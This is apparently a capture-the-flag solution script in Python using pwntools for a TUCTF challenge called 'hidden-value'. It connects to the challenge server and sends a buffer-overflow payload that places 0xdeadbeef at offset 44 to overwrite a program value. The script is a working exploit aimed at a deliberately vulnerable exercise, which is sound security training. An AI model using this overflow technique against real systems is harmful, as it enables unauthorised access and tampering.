from pwn import *

exe = context.binary = ELF('hidden-value')

io = remote('chal.tuctf.com', 30011)
io.recvuntil(b'Enter your name: ')
payload = fit({
    44: p32(0xdeadbeef),
})
io.sendline(payload)
print(io.recvall())